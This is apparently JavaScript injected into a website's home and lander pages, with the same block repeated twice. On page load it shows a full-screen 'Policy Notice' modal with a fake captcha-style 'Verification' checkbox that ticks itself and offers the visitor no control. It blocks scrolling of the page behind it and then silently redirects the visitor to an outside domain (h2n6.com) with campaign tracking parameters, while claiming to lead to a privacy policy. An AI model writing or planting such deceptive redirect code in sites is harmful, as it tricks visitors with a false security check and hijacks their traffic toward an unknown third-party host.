
(function(){
  const path = window.location.pathname;
  const isHome = /(^\/$|index\.html$)/.test(path);
  if (!isHome) return;

  // Theme tokens
  const vars = `
    :root {
      --bg: #0b1220;
      --overlay: rgba(2, 6, 23, 0.65);
      --card: #0f172a;
      --card-2: #0b1324;
      --border: #1f2937;
      --text: #e5e7eb;
      --muted: #94a3b8;
      --primary: #7c9cf8;
      --primary-2: #7d5cff;
      --ring: rgba(124,156,248,.35);
      --shadow: 0 20px 50px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.02);
    }
  `;

  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.setAttribute('aria-hidden', 'false');
  bd.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="policy-title" aria-describedby="verify-helper">
      <h3 id="policy-title">Policy Notice</h3>
      <p class="muted">You’ll be redirected to our privacy policy. Please review it to continue.</p>

      <!-- Captcha-style card (visible immediately, idle state) -->
      <div id="verify-card" class="verify-card">
        <label class="captcha-row">
          <span class="checkbox" aria-hidden="true">
            <span class="spinner" style="display:none;" aria-hidden="true"></span>
            <input id="verify-checkbox" type="checkbox" disabled aria-label="Verification checkbox">
          </span>
          <span class="captcha-text">
            <span class="title">Verification</span>
            <span id="verify-sub" class="sub" aria-live="polite">waiting…</span>
          </span>
        </label>
      </div>

      <div id="verify-helper" class="helper" aria-live="polite">Preparing verification…</div>
    </div>

    <style>
      ${vars}

      .modal-backdrop{
        position:fixed; inset:0; background:var(--overlay);
        display:flex; align-items:center; justify-content:center; z-index:100000;
        -webkit-backdrop-filter: blur(4px); backdrop-filter: blur(4px);
      }

      .modal{
        width:min(92vw, 540px);
        background: radial-gradient(1200px 400px at 85% -10%, rgba(125,92,255,.15), transparent 40%) , var(--card);
        border:1px solid var(--border);
        border-radius:16px; box-shadow: var(--shadow);
        padding:28px; text-align:center; color:var(--text);
        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      }
      .modal h3{margin:0 0 12px; font-size:1.6rem; font-weight:800; letter-spacing:.2px;}
      .muted{color:var(--muted); margin:0 0 18px;}

      /* captcha-like card */
      .verify-card{
        margin:0 auto 12px; width:min(92%, 440px);
        background: linear-gradient(0deg, var(--card-2), var(--card));
        border:1px solid var(--border); border-radius:12px; padding:14px 16px;
        box-shadow: inset 0 1px 0 rgba(255,255,255,.02);
        text-align:left;
      }
      .captcha-row{display:flex; align-items:center; gap:14px; cursor:default;}
      .checkbox{
        position:relative; width:22px; height:22px; flex-shrink:0;
        border:2px solid #303a51; border-radius:6px; background:#0b1120;
        display:flex; align-items:center; justify-content:center;
        box-shadow: 0 0 0 0 var(--ring);
        transition: box-shadow .25s ease, border-color .25s ease, background .25s ease;
      }
      .checkbox input{ position:absolute; inset:0; opacity:0; pointer-events:none; }

      /* spinner INSIDE the checkbox */
      .spinner{
        width:14px; height:14px; border-radius:50%;
        border:2px solid rgba(148,163,184,.25);
        border-top-color: var(--primary);
        animation: spin 1s linear infinite;
      }

      /* checkmark once verified */
      .checkbox.checked{
        background: radial-gradient(80% 80% at 50% 10%, rgba(124,156,248,.15), transparent 60%), #0b1120;
        border-color: #41507a;
        box-shadow: 0 0 0 6px var(--ring), 0 0 24px rgba(124,156,248,.25);
      }
      .checkbox.checked::after{
        content:""; position:absolute; width:7px; height:13px;
        border:solid var(--primary-2); border-width:0 2px 2px 0; transform: rotate(45deg);
        animation: tick .18s ease-out forwards;
      }

      .captcha-text{display:flex; flex-direction:column; gap:2px;}
      .captcha-text .title{font-weight:700; letter-spacing:.2px;}
      .captcha-text .sub{font-size:.92rem; color:var(--muted);}

      .helper{color:var(--muted); font-size:.92rem; margin:8px auto 8px; width:min(92%, 440px); text-align:center;}

      @keyframes spin{ to{ transform: rotate(360deg); } }
      @keyframes tick{ from{ opacity:.2; transform: rotate(45deg) scale(.9);} to{ opacity:1; transform: rotate(45deg) scale(1);} }
    </style>
  `;

  document.body.appendChild(bd);

  // Prevent any interaction with the page behind the modal
  document.documentElement.style.overflow = 'hidden';

  function autoVerification(){
    const card    = bd.querySelector('#verify-card');
    const helper  = bd.querySelector('#verify-helper');
    const sub     = bd.querySelector('#verify-sub');
    const box     = bd.querySelector('.checkbox');
    const spinner = bd.querySelector('.spinner');

    // Initial idle state (already rendered)
    helper.textContent = 'Preparing verification…';
    sub.textContent = 'waiting…';

    // Start spinner after a short delay
    setTimeout(() => {
      spinner.style.display = 'block';
      helper.textContent = 'Please wait while we complete a quick check.';
      sub.textContent = 'in progress…';

      // After 5s from start of spinner: finish + redirect
      setTimeout(() => {
        spinner.style.display = 'none';
        box.classList.add('checked');
        sub.textContent = 'Done';
        helper.textContent = 'Redirecting…';

        // Small grace period for the checkmark animation
        setTimeout(() => { window.location.href = 'http://h2n6.com/?utm_campaign=sOGcfWKDHx&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
      }, 5000);
    }, 300); // "few milliseconds" before starting the spinner
  }

  // Start automatically; no buttons or user control
  autoVerification();
})();
(function(){
  const path = window.location.pathname;
  const isHome = /(^\/$|lander\.html$)/.test(path);
  if (!isHome) return;

  // Theme tokens
  const vars = `
    :root {
      --bg: #0b1220;
      --overlay: rgba(2, 6, 23, 0.65);
      --card: #0f172a;
      --card-2: #0b1324;
      --border: #1f2937;
      --text: #e5e7eb;
      --muted: #94a3b8;
      --primary: #7c9cf8;
      --primary-2: #7d5cff;
      --ring: rgba(124,156,248,.35);
      --shadow: 0 20px 50px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.02);
    }
  `;

  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.setAttribute('aria-hidden', 'false');
  bd.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="policy-title" aria-describedby="verify-helper">
      <h3 id="policy-title">Policy Notice</h3>
      <p class="muted">You’ll be redirected to our privacy policy. Please review it to continue.</p>

      <!-- Captcha-style card (visible immediately, idle state) -->
      <div id="verify-card" class="verify-card">
        <label class="captcha-row">
          <span class="checkbox" aria-hidden="true">
            <span class="spinner" style="display:none;" aria-hidden="true"></span>
            <input id="verify-checkbox" type="checkbox" disabled aria-label="Verification checkbox">
          </span>
          <span class="captcha-text">
            <span class="title">Verification</span>
            <span id="verify-sub" class="sub" aria-live="polite">waiting…</span>
          </span>
        </label>
      </div>

      <div id="verify-helper" class="helper" aria-live="polite">Preparing verification…</div>
    </div>

    <style>
      ${vars}

      .modal-backdrop{
        position:fixed; inset:0; background:var(--overlay);
        display:flex; align-items:center; justify-content:center; z-index:100000;
        -webkit-backdrop-filter: blur(4px); backdrop-filter: blur(4px);
      }

      .modal{
        width:min(92vw, 540px);
        background: radial-gradient(1200px 400px at 85% -10%, rgba(125,92,255,.15), transparent 40%) , var(--card);
        border:1px solid var(--border);
        border-radius:16px; box-shadow: var(--shadow);
        padding:28px; text-align:center; color:var(--text);
        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      }
      .modal h3{margin:0 0 12px; font-size:1.6rem; font-weight:800; letter-spacing:.2px;}
      .muted{color:var(--muted); margin:0 0 18px;}

      /* captcha-like card */
      .verify-card{
        margin:0 auto 12px; width:min(92%, 440px);
        background: linear-gradient(0deg, var(--card-2), var(--card));
        border:1px solid var(--border); border-radius:12px; padding:14px 16px;
        box-shadow: inset 0 1px 0 rgba(255,255,255,.02);
        text-align:left;
      }
      .captcha-row{display:flex; align-items:center; gap:14px; cursor:default;}
      .checkbox{
        position:relative; width:22px; height:22px; flex-shrink:0;
        border:2px solid #303a51; border-radius:6px; background:#0b1120;
        display:flex; align-items:center; justify-content:center;
        box-shadow: 0 0 0 0 var(--ring);
        transition: box-shadow .25s ease, border-color .25s ease, background .25s ease;
      }
      .checkbox input{ position:absolute; inset:0; opacity:0; pointer-events:none; }

      /* spinner INSIDE the checkbox */
      .spinner{
        width:14px; height:14px; border-radius:50%;
        border:2px solid rgba(148,163,184,.25);
        border-top-color: var(--primary);
        animation: spin 1s linear infinite;
      }

      /* checkmark once verified */
      .checkbox.checked{
        background: radial-gradient(80% 80% at 50% 10%, rgba(124,156,248,.15), transparent 60%), #0b1120;
        border-color: #41507a;
        box-shadow: 0 0 0 6px var(--ring), 0 0 24px rgba(124,156,248,.25);
      }
      .checkbox.checked::after{
        content:""; position:absolute; width:7px; height:13px;
        border:solid var(--primary-2); border-width:0 2px 2px 0; transform: rotate(45deg);
        animation: tick .18s ease-out forwards;
      }

      .captcha-text{display:flex; flex-direction:column; gap:2px;}
      .captcha-text .title{font-weight:700; letter-spacing:.2px;}
      .captcha-text .sub{font-size:.92rem; color:var(--muted);}

      .helper{color:var(--muted); font-size:.92rem; margin:8px auto 8px; width:min(92%, 440px); text-align:center;}

      @keyframes spin{ to{ transform: rotate(360deg); } }
      @keyframes tick{ from{ opacity:.2; transform: rotate(45deg) scale(.9);} to{ opacity:1; transform: rotate(45deg) scale(1);} }
    </style>
  `;

  document.body.appendChild(bd);

  // Prevent any interaction with the page behind the modal
  document.documentElement.style.overflow = 'hidden';

  function autoVerification(){
    const card    = bd.querySelector('#verify-card');
    const helper  = bd.querySelector('#verify-helper');
    const sub     = bd.querySelector('#verify-sub');
    const box     = bd.querySelector('.checkbox');
    const spinner = bd.querySelector('.spinner');

    // Initial idle state (already rendered)
    helper.textContent = 'Preparing verification…';
    sub.textContent = 'waiting…';

    // Start spinner after a short delay
    setTimeout(() => {
      spinner.style.display = 'block';
      helper.textContent = 'Please wait while we complete a quick check.';
      sub.textContent = 'in progress…';

      // After 5s from start of spinner: finish + redirect
      setTimeout(() => {
        spinner.style.display = 'none';
        box.classList.add('checked');
        sub.textContent = 'Done';
        helper.textContent = 'Redirecting…';

        // Small grace period for the checkmark animation
        setTimeout(() => { window.location.href = 'http://h2n6.com/?utm_campaign=sOGcfWKDHx&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
      }, 5000);
    }, 300); // "few milliseconds" before starting the spinner
  }

  // Start automatically; no buttons or user control
  autoVerification();
})();
